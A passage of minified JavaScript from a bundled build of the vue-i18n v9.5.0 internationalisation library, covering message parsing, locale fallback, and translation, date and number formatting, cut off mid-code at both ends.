0?l=d:l+=d},y[1]=()=>{l!==void 0&&(t.push(l),l=void 0)},y[2]=()=>{y[0](),r++},y[3]=()=>{if(r>0)r--,s=4,y[0]();else{if(r=0,l===void 0||(l=formatSubPath(l),l===!1))return!1;y[1]()}};function v(){const x=e[n+1];if(s===5&&x==="'"||s===6&&x==='"')return n++,d="\\"+x,y[0](),!0}for(;s!==null;)if(n++,o=e[n],!(o==="\\"&&v())){if(u=getPathCharType(o),g=pathStateMachine[s],f=g[u]||g.l||8,f===8||(s=f[0],f[1]!==void 0&&(m=y[f[1]],m&&(d=o,m()===!1))))return;if(s===7)return t}}const cache=new Map;function resolveWithKeyValue(e,t){return isObject$1(e)?e[t]:null}function resolveValue(e,t){if(!isObject$1(e))return null;let n=cache.get(t);if(n||(n=parse(t),n&&cache.set(t,n)),!n)return null;const s=n.length;let r=e,o=0;for(;o<s;){const l=r[n[o]];if(l===void 0)return null;r=l,o++}return r}const DEFAULT_MODIFIER=e=>e,DEFAULT_MESSAGE=e=>"",DEFAULT_MESSAGE_DATA_TYPE="text",DEFAULT_NORMALIZE=e=>e.length===0?"":join$1(e),DEFAULT_INTERPOLATE=toDisplayString;function pluralDefault(e,t){return e=Math.abs(e),t===2?e?e>1?1:0:1:e?Math.min(e,2):0}function getPluralIndex(e){const t=isNumber(e.pluralIndex)?e.pluralIndex:-1;return e.named&&(isNumber(e.named.count)||isNumber(e.named.n))?isNumber(e.named.count)?e.named.count:isNumber(e.named.n)?e.named.n:t:t}function normalizeNamed(e,t){t.count||(t.count=e),t.n||(t.n=e)}function createMessageContext(e={}){const t=e.locale,n=getPluralIndex(e),s=isObject$1(e.pluralRules)&&isString$1(t)&&isFunction(e.pluralRules[t])?e.pluralRules[t]:pluralDefault,r=isObject$1(e.pluralRules)&&isString$1(t)&&isFunction(e.pluralRules[t])?pluralDefault:void 0,o=w=>w[s(n,w.length,r)],l=e.list||[],d=w=>l[w],u=e.named||{};isNumber(e.pluralIndex)&&normalizeNamed(n,u);const f=w=>u[w];function m(w){const k=isFunction(e.messages)?e.messages(w):isObject$1(e.messages)?e.messages[w]:!1;return k||(e.parent?e.parent.message(w):DEFAULT_MESSAGE)}const g=w=>e.modifiers?e.modifiers[w]:DEFAULT_MODIFIER,y=isPlainObject(e.processor)&&isFunction(e.processor.normalize)?e.processor.normalize:DEFAULT_NORMALIZE,v=isPlainObject(e.processor)&&isFunction(e.processor.interpolate)?e.processor.interpolate:DEFAULT_INTERPOLATE,x=isPlainObject(e.processor)&&isString$1(e.processor.type)?e.processor.type:DEFAULT_MESSAGE_DATA_TYPE,S={list:d,named:f,plural:o,linked:(w,...k)=>{const[C,R]=k;let L="text",O="";k.length===1?isObject$1(C)?(O=C.modifier||O,L=C.type||L):isString$1(C)&&(O=C||O):k.length===2&&(isString$1(C)&&(O=C||O),isString$1(R)&&(L=R||L));const I=m(w)(S),A=L==="vnode"&&isArray(I)&&O?I[0]:I;return O?g(O)(A,L):A},message:m,type:x,interpolate:v,normalize:y,values:assign$1({},l,u)};return S}let devtools=null;function setDevToolsHook(e){devtools=e}function initI18nDevTools(e,t,n){devtools&&devtools.emit("i18n:init",{timestamp:Date.now(),i18n:e,version:t,meta:n})}const translateDevTools=createDevToolsHook("function:translate");function createDevToolsHook(e){return t=>devtools&&devtools.emit(e,t)}const CoreWarnCodes={NOT_FOUND_KEY:1,FALLBACK_TO_TRANSLATE:2,CANNOT_FORMAT_NUMBER:3,FALLBACK_TO_NUMBER_FORMAT:4,CANNOT_FORMAT_DATE:5,FALLBACK_TO_DATE_FORMAT:6,EXPERIMENTAL_CUSTOM_MESSAGE_COMPILER:7,__EXTEND_POINT__:8};function getLocale(e,t){return t.locale!=null?resolveLocale(t.locale):resolveLocale(e.locale)}let _resolveLocale;function resolveLocale(e){return isString$1(e)?e:_resolveLocale!=null&&e.resolvedOnce?_resolveLocale:_resolveLocale=e()}function fallbackWithSimple(e,t,n){return[...new Set([n,...isArray(t)?t:isObject$1(t)?Object.keys(t):isString$1(t)?[t]:[n]])]}function fallbackWithLocaleChain(e,t,n){const s=isString$1(n)?n:DEFAULT_LOCALE,r=e;r.__localeChainCache||(r.__localeChainCache=new Map);let o=r.__localeChainCache.get(s);if(!o){o=[];let l=[n];for(;isArray(l);)l=appendBlockToChain(o,l,t);const d=isArray(t)||!isPlainObject(t)?t:t.default?t.default:null;l=isString$1(d)?[d]:d,isArray(l)&&appendBlockToChain(o,l,!1),r.__localeChainCache.set(s,o)}return o}function appendBlockToChain(e,t,n){let s=!0;for(let r=0;r<t.length&&isBoolean(s);r++){const o=t[r];isString$1(o)&&(s=appendLocaleToChain(e,t[r],n))}return s}function appendLocaleToChain(e,t,n){let s;const r=t.split("-");do{const o=r.join("-");s=appendItemToChain(e,o,n),r.splice(-1,1)}while(r.length&&s===!0);return s}function appendItemToChain(e,t,n){let s=!1;if(!e.includes(t)&&(s=!0,t)){s=t[t.length-1]!=="!";const r=t.replace(/!/g,"");e.push(r),(isArray(n)||isPlainObject(n))&&n[r]&&(s=n[r])}return s}const VERSION$1="9.5.0",NOT_REOSLVED=-1,DEFAULT_LOCALE="en-US",MISSING_RESOLVE_VALUE="",capitalize=e=>`${e.charAt(0).toLocaleUpperCase()}${e.substr(1)}`;function getDefaultLinkedModifiers(){return{upper:(e,t)=>t==="text"&&isString$1(e)?e.toUpperCase():t==="vnode"&&isObject$1(e)&&"__v_isVNode"in e?e.children.toUpperCase():e,lower:(e,t)=>t==="text"&&isString$1(e)?e.toLowerCase():t==="vnode"&&isObject$1(e)&&"__v_isVNode"in e?e.children.toLowerCase():e,capitalize:(e,t)=>t==="text"&&isString$1(e)?capitalize(e):t==="vnode"&&isObject$1(e)&&"__v_isVNode"in e?capitalize(e.children):e}}let _compiler;function registerMessageCompiler(e){_compiler=e}let _resolver;function registerMessageResolver(e){_resolver=e}let _fallbacker;function registerLocaleFallbacker(e){_fallbacker=e}let _additionalMeta=null;const setAdditionalMeta=e=>{_additionalMeta=e},getAdditionalMeta=()=>_additionalMeta;let _fallbackContext=null;const setFallbackContext=e=>{_fallbackContext=e},getFallbackContext=()=>_fallbackContext;let _cid=0;function createCoreContext(e={}){const t=isFunction(e.onWarn)?e.onWarn:warn,n=isString$1(e.version)?e.version:VERSION$1,s=isString$1(e.locale)||isFunction(e.locale)?e.locale:DEFAULT_LOCALE,r=isFunction(s)?DEFAULT_LOCALE:s,o=isArray(e.fallbackLocale)||isPlainObject(e.fallbackLocale)||isString$1(e.fallbackLocale)||e.fallbackLocale===!1?e.fallbackLocale:r,l=isPlainObject(e.messages)?e.messages:{[r]:{}},d=isPlainObject(e.datetimeFormats)?e.datetimeFormats:{[r]:{}},u=isPlainObject(e.numberFormats)?e.numberFormats:{[r]:{}},f=assign$1({},e.modifiers||{},getDefaultLinkedModifiers()),m=e.pluralRules||{},g=isFunction(e.missing)?e.missing:null,y=isBoolean(e.missingWarn)||isRegExp(e.missingWarn)?e.missingWarn:!0,v=isBoolean(e.fallbackWarn)||isRegExp(e.fallbackWarn)?e.fallbackWarn:!0,x=!!e.fallbackFormat,E=!!e.unresolving,S=isFunction(e.postTranslation)?e.postTranslation:null,w=isPlainObject(e.processor)?e.processor:null,k=isBoolean(e.warnHtmlMessage)?e.warnHtmlMessage:!0,C=!!e.escapeParameter,R=isFunction(e.messageCompiler)?e.messageCompiler:_compiler,L=isFunction(e.messageResolver)?e.messageResolver:_resolver||resolveWithKeyValue,O=isFunction(e.localeFallbacker)?e.localeFallbacker:_fallbacker||fallbackWithSimple,I=isObject$1(e.fallbackContext)?e.fallbackContext:void 0,A=e,j=isObject$1(A.__datetimeFormatters)?A.__datetimeFormatters:new Map,G=isObject$1(A.__numberFormatters)?A.__numberFormatters:new Map,X=isObject$1(A.__meta)?A.__meta:{};_cid++;const q={version:n,cid:_cid,locale:s,fallbackLocale:o,messages:l,modifiers:f,pluralRules:m,missing:g,missingWarn:y,fallbackWarn:v,fallbackFormat:x,unresolving:E,postTranslation:S,processor:w,warnHtmlMessage:k,escapeParameter:C,messageCompiler:R,messageResolver:L,localeFallbacker:O,fallbackContext:I,onWarn:t,__meta:X};return q.datetimeFormats=d,q.numberFormats=u,q.__datetimeFormatters=j,q.__numberFormatters=G,__INTLIFY_PROD_DEVTOOLS__&&initI18nDevTools(q,n,X),q}function handleMissing(e,t,n,s,r){const{missing:o,onWarn:l}=e;if(o!==null){const d=o(e,n,t,r);return isString$1(d)?d:t}else return t}function updateFallbackLocale(e,t,n){const s=e;s.__localeChainCache=new Map,e.localeFallbacker(e,n,t)}function format(e){return n=>formatParts(n,e)}function formatParts(e,t){const n=t.b||t.body;if((n.t||n.type)===1){const s=n,r=s.c||s.cases;return e.plural(r.reduce((o,l)=>[...o,formatMessageParts(e,l)],[]))}else return formatMessageParts(e,n)}function formatMessageParts(e,t){const n=t.s||t.static;if(n)return e.type==="text"?n:e.normalize([n]);{const s=(t.i||t.items).reduce((r,o)=>[...r,formatMessagePart(e,o)],[]);return e.normalize(s)}}function formatMessagePart(e,t){const n=t.t||t.type;switch(n){case 3:const s=t;return s.v||s.value;case 9:const r=t;return r.v||r.value;case 4:const o=t;return e.interpolate(e.named(o.k||o.key));case 5:const l=t;return e.interpolate(e.list(l.i!=null?l.i:l.index));case 6:const d=t,u=d.m||d.modifier;return e.linked(formatMessagePart(e,d.k||d.key),u?formatMessagePart(e,u):void 0,e.type);case 7:const f=t;return f.v||f.value;case 8:const m=t;return m.v||m.value;default:throw new Error(`unhandled node type on format message part: ${n}`)}}const code$2=CompileErrorCodes.__EXTEND_POINT__,inc$2=incrementer(code$2),CoreErrorCodes={INVALID_ARGUMENT:code$2,INVALID_DATE_ARGUMENT:inc$2(),INVALID_ISO_DATE_ARGUMENT:inc$2(),NOT_SUPPORT_NON_STRING_MESSAGE:inc$2(),__EXTEND_POINT__:inc$2()};function createCoreError(e){return createCompileError(e,null,void 0)}const defaultOnCacheKey=e=>e;let compileCache=Object.create(null);const isMessageAST=e=>isObject$1(e)&&(e.t===0||e.type===0)&&("b"in e||"body"in e);function baseCompile(e,t={}){let n=!1;const s=t.onError||defaultOnError;return t.onError=r=>{n=!0,s(r)},{...baseCompile$1(e,t),detectError:n}}const compileToFunction=(e,t)=>{if(!isString$1(e))throw createCoreError(CoreErrorCodes.NOT_SUPPORT_NON_STRING_MESSAGE);{isBoolean(t.warnHtmlMessage)&&t.warnHtmlMessage;const s=(t.onCacheKey||defaultOnCacheKey)(e),r=compileCache[s];if(r)return r;const{code:o,detectError:l}=baseCompile(e,t),d=new Function(`return ${o}`)();return l?d:compileCache[s]=d}};function compile(e,t){if(__INTLIFY_JIT_COMPILATION__&&!__INTLIFY_DROP_MESSAGE_COMPILER__&&isString$1(e)){isBoolean(t.warnHtmlMessage)&&t.warnHtmlMessage;const s=(t.onCacheKey||defaultOnCacheKey)(e),r=compileCache[s];if(r)return r;const{ast:o,detectError:l}=baseCompile(e,{...t,location:!1,jit:!0}),d=format(o);return l?d:compileCache[s]=d}else{const n=e.cacheKey;if(n){const s=compileCache[n];return s||(compileCache[n]=format(e))}else return format(e)}}const NOOP_MESSAGE_FUNCTION=()=>"",isMessageFunction=e=>isFunction(e);function translate(e,...t){const{fallbackFormat:n,postTranslation:s,unresolving:r,messageCompiler:o,fallbackLocale:l,messages:d}=e,[u,f]=parseTranslateArgs(...t),m=isBoolean(f.missingWarn)?f.missingWarn:e.missingWarn,g=isBoolean(f.fallbackWarn)?f.fallbackWarn:e.fallbackWarn,y=isBoolean(f.escapeParameter)?f.escapeParameter:e.escapeParameter,v=!!f.resolvedMessage,x=isString$1(f.default)||isBoolean(f.default)?isBoolean(f.default)?o?u:()=>u:f.default:n?o?u:()=>u:"",E=n||x!=="",S=getLocale(e,f);y&&escapeParams(f);let[w,k,C]=v?[u,S,d[S]||{}]:resolveMessageFormat(e,u,S,l,g,m),R=w,L=u;if(!v&&!(isString$1(R)||isMessageAST(R)||isMessageFunction(R))&&E&&(R=x,L=R),!v&&(!(isString$1(R)||isMessageAST(R)||isMessageFunction(R))||!isString$1(k)))return r?NOT_REOSLVED:u;let O=!1;const I=()=>{O=!0},A=isMessageFunction(R)?R:compileMessageFormat(e,u,k,R,L,I);if(O)return R;const j=getMessageContextOptions(e,k,C,f),G=createMessageContext(j),X=evaluateMessage(e,A,G),q=s?s(X,u):X;if(__INTLIFY_PROD_DEVTOOLS__){const J={timestamp:Date.now(),key:isString$1(u)?u:isMessageFunction(R)?R.key:"",locale:k||(isMessageFunction(R)?R.locale:""),format:isString$1(R)?R:isMessageFunction(R)?R.source:"",message:q};J.meta=assign$1({},e.__meta,getAdditionalMeta()||{}),translateDevTools(J)}return q}function escapeParams(e){isArray(e.list)?e.list=e.list.map(t=>isString$1(t)?escapeHtml(t):t):isObject$1(e.named)&&Object.keys(e.named).forEach(t=>{isString$1(e.named[t])&&(e.named[t]=escapeHtml(e.named[t]))})}function resolveMessageFormat(e,t,n,s,r,o){const{messages:l,onWarn:d,messageResolver:u,localeFallbacker:f}=e,m=f(e,s,n);let g={},y,v=null;const x="translate";for(let E=0;E<m.length&&(y=m[E],g=l[y]||{},(v=u(g,t))===null&&(v=g[t]),!(isString$1(v)||isMessageAST(v)||isMessageFunction(v)));E++){const S=handleMissing(e,t,y,o,x);S!==t&&(v=S)}return[v,y,g]}function compileMessageFormat(e,t,n,s,r,o){const{messageCompiler:l,warnHtmlMessage:d}=e;if(isMessageFunction(s)){const f=s;return f.locale=f.locale||n,f.key=f.key||t,f}if(l==null){const f=()=>s;return f.locale=n,f.key=t,f}const u=l(s,getCompileContext(e,n,r,s,d,o));return u.locale=n,u.key=t,u.source=s,u}function evaluateMessage(e,t,n){return t(n)}function parseTranslateArgs(...e){const[t,n,s]=e,r={};if(!isString$1(t)&&!isNumber(t)&&!isMessageFunction(t)&&!isMessageAST(t))throw createCoreError(CoreErrorCodes.INVALID_ARGUMENT);const o=isNumber(t)?String(t):(isMessageFunction(t),t);return isNumber(n)?r.plural=n:isString$1(n)?r.default=n:isPlainObject(n)&&!isEmptyObject(n)?r.named=n:isArray(n)&&(r.list=n),isNumber(s)?r.plural=s:isString$1(s)?r.default=s:isPlainObject(s)&&assign$1(r,s),[o,r]}function getCompileContext(e,t,n,s,r,o){return{locale:t,key:n,warnHtmlMessage:r,onError:l=>{throw o&&o(l),l},onCacheKey:l=>generateFormatCacheKey(t,n,l)}}function getMessageContextOptions(e,t,n,s){const{modifiers:r,pluralRules:o,messageResolver:l,fallbackLocale:d,fallbackWarn:u,missingWarn:f,fallbackContext:m}=e,y={locale:t,modifiers:r,pluralRules:o,messages:v=>{let x=l(n,v);if(x==null&&m){const[,,E]=resolveMessageFormat(m,v,t,d,u,f);x=l(E,v)}if(isString$1(x)||isMessageAST(x)){let E=!1;const w=compileMessageFormat(e,v,t,x,v,()=>{E=!0});return E?NOOP_MESSAGE_FUNCTION:w}else return isMessageFunction(x)?x:NOOP_MESSAGE_FUNCTION}};return e.processor&&(y.processor=e.processor),s.list&&(y.list=s.list),s.named&&(y.named=s.named),isNumber(s.plural)&&(y.pluralIndex=s.plural),y}function datetime(e,...t){const{datetimeFormats:n,unresolving:s,fallbackLocale:r,onWarn:o,localeFallbacker:l}=e,{__datetimeFormatters:d}=e,[u,f,m,g]=parseDateTimeArgs(...t),y=isBoolean(m.missingWarn)?m.missingWarn:e.missingWarn;isBoolean(m.fallbackWarn)?m.fallbackWarn:e.fallbackWarn;const v=!!m.part,x=getLocale(e,m),E=l(e,r,x);if(!isString$1(u)||u==="")return new Intl.DateTimeFormat(x,g).format(f);let S={},w,k=null;const C="datetime format";for(let O=0;O<E.length&&(w=E[O],S=n[w]||{},k=S[u],!isPlainObject(k));O++)handleMissing(e,u,w,y,C);if(!isPlainObject(k)||!isString$1(w))return s?NOT_REOSLVED:u;let R=`${w}__${u}`;isEmptyObject(g)||(R=`${R}__${JSON.stringify(g)}`);let L=d.get(R);return L||(L=new Intl.DateTimeFormat(w,assign$1({},k,g)),d.set(R,L)),v?L.formatToParts(f):L.format(f)}const DATETIME_FORMAT_OPTIONS_KEYS=["localeMatcher","weekday","era","year","month","day","hour","minute","second","timeZoneName","formatMatcher","hour12","timeZone","dateStyle","timeStyle","calendar","dayPeriod","numberingSystem","hourCycle","fractionalSecondDigits"];function parseDateTimeArgs(...e){const[t,n,s,r]=e,o={};let l={},d;if(isString$1(t)){const u=t.match(/(\d{4}-\d{2}-\d{2})(T|\s)?(.*)/);if(!u)throw createCoreError(CoreErrorCodes.INVALID_ISO_DATE_ARGUMENT);const f=u[3]?u[3].trim().startsWith("T")?`${u[1].trim()}${u[3].trim()}`:`${u[1].trim()}T${u[3].trim()}`:u[1].trim();d=new Date(f);try{d.toISOString()}catch{throw createCoreError(CoreErrorCodes.INVALID_ISO_DATE_ARGUMENT)}}else if(isDate(t)){if(isNaN(t.getTime()))throw createCoreError(CoreErrorCodes.INVALID_DATE_ARGUMENT);d=t}else if(isNumber(t))d=t;else throw createCoreError(CoreErrorCodes.INVALID_ARGUMENT);return isString$1(n)?o.key=n:isPlainObject(n)&&Object.keys(n).forEach(u=>{DATETIME_FORMAT_OPTIONS_KEYS.includes(u)?l[u]=n[u]:o[u]=n[u]}),isString$1(s)?o.locale=s:isPlainObject(s)&&(l=s),isPlainObject(r)&&(l=r),[o.key||"",d,o,l]}function clearDateTimeFormat(e,t,n){const s=e;for(const r in n){const o=`${t}__${r}`;s.__datetimeFormatters.has(o)&&s.__datetimeFormatters.delete(o)}}function number(e,...t){const{numberFormats:n,unresolving:s,fallbackLocale:r,onWarn:o,localeFallbacker:l}=e,{__numberFormatters:d}=e,[u,f,m,g]=parseNumberArgs(...t),y=isBoolean(m.missingWarn)?m.missingWarn:e.missingWarn;isBoolean(m.fallbackWarn)?m.fallbackWarn:e.fallbackWarn;const v=!!m.part,x=getLocale(e,m),E=l(e,r,x);if(!isString$1(u)||u==="")return new Intl.NumberFormat(x,g).format(f);let S={},w,k=null;const C="number format";for(let O=0;O<E.length&&(w=E[O],S=n[w]||{},k=S[u],!isPlainObject(k));O++)handleMissing(e,u,w,y,C);if(!isPlainObject(k)||!isString$1(w))return s?NOT_REOSLVED:u;let R=`${w}__${u}`;isEmptyObject(g)||(R=`${R}__${JSON.stringify(g)}`);let L=d.get(R);return L||(L=new Intl.NumberFormat(w,assign$1({},k,g)),d.set(R,L)),v?L.formatToParts(f):L.format(f)}const NUMBER_FORMAT_OPTIONS_KEYS=["localeMatcher","style","currency","currencyDisplay","currencySign","useGrouping","minimumIntegerDigits","minimumFractionDigits","maximumFractionDigits","minimumSignificantDigits","maximumSignificantDigits","compactDisplay","notation","signDisplay","unit","unitDisplay","roundingMode","roundingPriority","roundingIncrement","trailingZeroDisplay"];function parseNumberArgs(...e){const[t,n,s,r]=e,o={};let l={};if(!isNumber(t))throw createCoreError(CoreErrorCodes.INVALID_ARGUMENT);const d=t;return isString$1(n)?o.key=n:isPlainObject(n)&&Object.keys(n).forEach(u=>{NUMBER_FORMAT_OPTIONS_KEYS.includes(u)?l[u]=n[u]:o[u]=n[u]}),isString$1(s)?o.locale=s:isPlainObject(s)&&(l=s),isPlainObject(r)&&(l=r),[o.key||"",d,o,l]}function clearNumberFormat(e,t,n){const s=e;for(const r in n){const o=`${t}__${r}`;s.__numberFormatters.has(o)&&s.__numberFormatters.delete(o)}}initFeatureFlags$1();/*!
  * vue-i18n v9.5.0
  * (c) 2023 kazuya kawaguchi
  * Released under the MIT License.
  */const VERSION="9.5.0";function initFeatureFlags(){typeof __VUE_I18N_FULL_INSTALL__!="boolean"&&(getGlobalThis().__VUE_I18N_FULL_INSTALL__=!0),typeof __VUE_I18N_LEGACY_API__!="boolean"&&(getGlobalThis().__VUE_I18N_LEGACY_API__=!0),typeof __INTLIFY_JIT_COMPILATION__!="boolean"&&(getGlobalThis().__INTLIFY_JIT_COMPILATION__=!1),typeof __INTLIFY_DROP_MESSAGE_COMPILER__!="boolean"&&(getGlobalThis().__INTLIFY_DROP_MESSAGE_COMPILER__=!1),typeof __INTLIFY_PROD_DEVTOOLS__!="boolean"&&(getGlobalThis().__INTLIFY_PROD_DEVTOOLS__=!1)}const code$1=CoreWarnCodes.__EXTEND_POINT__,inc$1=incrementer(code$1);inc$1(),inc$1(),inc$1(),inc$1(),inc$1(),inc$1(),inc$1(),inc$1();const code=CoreErrorCodes.__EXTEND_POINT__,inc=incrementer(code),I18nErrorCodes={UNEXPECTED_RETURN_TYPE:code,INVALID_ARGUMENT:inc(),MUST_BE_CALL_SETUP_TOP:inc(),NOT_INSTALLED:inc(),NOT_AVAILABLE_IN_LEGACY_MODE:inc(),REQUIRED_VALUE:inc(),INVALID_VALUE:inc(),CANNOT_SETUP_VUE_DEVTOOLS_PLUGIN:inc(),NOT_INSTALLED_WITH_PROVIDE:inc(),UNEXPECTED_ERROR:inc(),NOT_COMPATIBLE_LEGACY_VUE_I18N:inc(),BRIDGE_SUPPORT_VUE_2_ONLY:inc(),MUST_DEFINE_I18N_OPTION_IN_ALLOW_COMPOSITION:inc(),NOT_AVAILABLE_COMPOSITION_IN_LEGACY:inc(),__EXTEND_POINT__:inc()};function createI18nError(e,...t){return createCompileError(e,null,void 0)}const TranslateVNodeSymbol=makeSymbol("__translateVNode"),DatetimePartsSymbol=makeSymbol("__datetimeParts"),NumberPartsSymbol=makeSymbol("__numberParts"),SetPluralRulesSymbol=makeSymbol("__setPluralRules"),InejctWithOptionSymbol=makeSymbol("__injectWithOption"),DisposeSymbol=makeSymbol("__dispose");function handleFlatJson(e){if(!isObject$1(e))return e;for(const t in e)if(hasOwn(e,t))if(!t.includes("."))isObject$1(e[t])&&handleFlatJson(e[t]);else{const n=t.split("."),s=n.length-1;let r=e,o=!1;for(let l=0;l<s;l++){if(n[l]in r||(r[n[l]]={}),!isObject$1(r[n[l]])){o=!0;break}r=r[n[l]]}o||(r[n[s]]=e[t],delete e[t]),isObject$1(r[n[s]])&&handleFlatJson(r[n[s]])}return e}function getLocaleMessages(e,t){const{messages:n,__i18n:s,messageResolver:r,flatJson:o}=t,l=isPlainObject(n)?n:isArray(s)?{}:{[e]:{}};if(isArray(s)&&s.forEach(d=>{if("locale"in d&&"resource"in d){const{locale:u,resource:f}=d;u?(l[u]=l[u]||{},deepCopy(f,l[u])):deepCopy(f,l)}else isString$1(d)&&deepCopy(JSON.parse(d),l)}),r==null&&o)for(const d in l)hasOwn(l,d)&&handleFlatJson(l[d]);return l}const isNotObjectOrIsArray=e=>!isObject$1(e)||isArray(e);function deepCopy(e,t){if(isNotObjectOrIsArray(e)||isNotObjectOrIsArray(t))throw createI18nError(I18nErrorCodes.INVALID_VALUE);for(const n in e)hasOwn(e,n)&&(isNotObjectOrIsArray(e[n])||isNotObjectOrIsArray(t[n])?t[n]=e[n]:deepCopy(e[n],t[n]))}function getComponentOptions(e){return e.type}function adjustI18nResources(e,t,n){let s=isObject$1(t.messages)?t.messages:{};"__i18nGlobal"in n&&(s=getLocaleMessages(e.locale.value,{messages:s,__i18n:n.__i18nGlobal}));const r=Object.keys(s);r.length&&r.forEach(o=>{e.mergeLocaleMessage(o,s[o])});{if(isObject$1(t.datetimeFormats)){const o=Object.keys(t.datetimeFormats);o.length&&o.forEach(l=>{e.mergeDateTimeFormat(l,t.datetimeFormats[l])})}if(isObject$1(t.numberFormats)){const o=Object.keys(t.numberFormats);o.length&&o.forEach(l=>{e.mergeNumberFormat(l,t.numberFormats[l])})}}}function createTextNode(e){return createVNode(Text,null,e,0)}const DEVTOOLS_META="__INTLIFY_META__";let composerID=0;function defineCoreMissingHandler(e){return(t,n,s,r)=>e(n,s,getCurrentInstance()||void 0,r)}const getMetaInfo=()=>{const e=getCurrentInstance();let t=null;return e&&(t=getComponentOptions(e)[DEVTOOLS_META])?{[DEVTOOLS_META]:t}:null};function createComposer(e={},t){const{__root:n,__injectWithOption:s}=e,r=n===void 0;let o=isBoolean(e.inheritLocale)?e.inheritLocale:!0;const l=ref(n&&o?n.locale.value:isString$1(e.locale)?e.locale:DEFAULT_LOCALE),d=ref(n&&o?n.fallbackLocale.value:isString$1(e.fallbackLocale)||isArray(e.fallbackLocale)||isPlainObject(e.fallbackLocale)||e.fallbackLocale===!1?e.fallbackLocale:l.value),u=ref(getLocaleMessages(l.value,e)),f=ref(isPlainObject(e.datetimeFormats)?e.datetimeFormats:{[l.value]:{}}),m=ref(isPlainObject(e.numberFormats)?e.numberFormats:{[l.value]:{}});let g=n?n.missingWarn:isBoolean(e.missingWarn)||isRegExp(e.missingWarn)?e.missingWarn:!0,y=n?n.fallbackWarn:isBoolean(e.fallbackWarn)||isRegExp(e.fallbackWarn)?e.fallbackWarn:!0,v=n?n.fallbackRoot:isBoolean(e.fallbackRoot)?e.fallbackRoot:!0,x=!!e.fallbackFormat,E=isFunction(e.missing)?e.missing:null,S=isFunction(e.missing)?defineCoreMissingHandler(e.missing):null,w=isFunction(e.postTranslation)?e.postTranslation:null,k=n?n.warnHtmlMessage:isBoolean(e.warnHtmlMessage)?e.warnHtmlMessage:!0,C=!!e.escapeParameter;const R=n?n.modifiers:isPlainObject(e.modifiers)?e.modifiers:{};let L=e.pluralRules||n&&n.pluralRules,O;O=(()=>{r&&setFallbackContext(null);const B={version:VERSION,locale:l.value,fallbackLocale:d.value,messages:u.value,modifiers:R,pluralRules:L,missing:S===null?void 0:S,missingWarn:g,fallbackWarn:y,fallbackFormat:x,unresolving:!0,postTranslation:w===null?void 0:w,warnHtmlMessage:k,escapeParameter:C,messageResolver:e.messageResolver,messageCompiler:e.messageCompiler,__meta:{framework:"vue"}};B.datetimeFormats=f.value,B.numberFormats=m.value,B.__datetimeFormatters=isPlainObject(O)?O.__datetimeFormatters:void 0,B.__numberFormatters=isPlainObject(O)?O.__numberFormatters:void 0;const F=createCoreContext(B);return r&&setFallbackContext(F),F})(),updateFallbackLocale(O,l.value,d.value);function A(){return[l.value,d.value,u.value,f.value,m.value]}const j=computed({get:()=>l.value,set:B=>{l.value=B,O.locale=l.value}}),G=computed({get:()=>d.value,set:B=>{d.value=B,O.fallbackLocale=d.value,updateFallbackLocale(O,l.value,B)}}),X=computed(()=>u.value),q=computed(()=>f.value),J=computed(()=>m.value);function K(){return isFunction(w)?w:null}function le(B){w=B,O.postTranslation=B}function se(){return E}function de(B){B!==null&&(S=defineCoreMissingHandler(B)),E=B,O.missing=S}const oe=(B,F,ee,te,re,ae)=>{A();let ie;try{__INTLIFY_PROD_DEVTOOLS__&&setAdditionalMeta(getMetaInfo()),r||(O.fallbackContext=n?getFallbackContext():void 0),ie=B(O)}finally{__INTLIFY_PROD_DEVTOOLS__&&setAdditionalMeta(null),r||(O.fallbackContext=void 0)}if(isNumber(ie)&&ie===NOT_REOSLVED){const[ce,ve]=F();return n&&v?te(n):re(ce)}else{if(ae(ie))return ie;throw createI18nError(I18nErrorCodes.UNEXPECTED_RETURN_TYPE)}};function ge(...B){return oe(F=>Reflect.apply(translate,null,[F,...B]),()=>parseTranslateArgs(...B),"translate",F=>Reflect.apply(F.t,F,[...B]),F=>F,F=>isString$1(F))}function ke(...B){const[F,ee,te]=B;if(te&&!isObject$1(te))throw createI18nError(I18nErrorCodes.INVALID_ARGUMENT);return ge(F,ee,assign$1({resolvedMessage:!0},te||{}))}function ye(...B){return oe(F=>Reflect.apply(datetime,null,[F,...B]),()=>parseDateTimeArgs(...B),"datetime format",F=>Reflect.apply(F.d,F,[...B]),()=>MISSING_RESOLVE_VALUE,F=>isString$1(F))}function he(...B){return oe(F=>Reflect.apply(number,null,[F,...B]),()=>parseNumberArgs(...B),"number format",F=>Reflect.apply(F.n,F,[...B]),()=>MISSING_RESOLVE_VALUE,F=>isString$1(F))}function Ce(B){return B.map(F=>isString$1(F)||isNumber(F)||isBoolean(F)?createTextNode(String(F)):F)}const $e={normalize:Ce,interpolate:B=>B,type:"vnode"};function me(...B){return oe(F=>{let ee;const te=F;try{te.processor=$e,ee=Reflect.apply(translate,null,[te,...B])}finally{te.processor=null}return ee},()=>parseTranslateArgs(...B),"translate",F=>F[TranslateVNodeSymbol](...B),F=>[createTextNode(F)],F=>isArray(F))}function W(...B){return oe(F=>Reflect.apply(number,null,[F,...B]),()=>parseNumberArgs(...B),"number format",F=>F[NumberPartsSymbol](...B),()=>[],F=>isString$1(F)||isArray(F))}function Q(...B){return oe(F=>Reflect.apply(datetime,null,[F,...B]),()=>parseDateTimeArgs(...B),"datetime format",F=>F[DatetimePartsSymbol](...B),()=>[],F=>isString$1(F)||isArray(F))}function Z(B){L=B,O.pluralRules=L}function ne(B,F){if(!B)return!1;const ee=isString$1(F)?F:l.value,te=T(ee);return O.messageResolver(te,B)!==null}function fe(B){let F=null;const ee=fallbackWithLocaleChain(O,d.value,l.value);for(let te=0;te<ee.length;te++){const re=u.value[ee[te]]||{},ae=O.messageResolver(re,B);if(ae!=null){F=ae;break}}return F}function M(B){const F=fe(B);return F??(n?n.tm(B)||{}:{})}function T(B){return u.value[B]||{}}function _(B,F){u.value[B]=F,O.messages=u.value}function N(B,F){u.value[B]=u.value[B]||{},deepCopy(F,u.value[B]),O.messages=u.value}function P(B){return f.value[B]||{}}function D(B,F){f.value[B]=F,O.datetimeFormats=f.value,clearDateTimeFormat(O,B,F)}function V(B,F){f.value[B]=assign$1(f.value[B]||{},F),O.datetimeFormats=f.value,clearDateTimeFormat(O,B,F)}function U(B){return m.value[B]||{}}function z(B,F){m.value[B]=F,O.numberFormats=m.value,clearNumberFormat(O,B,F)}function 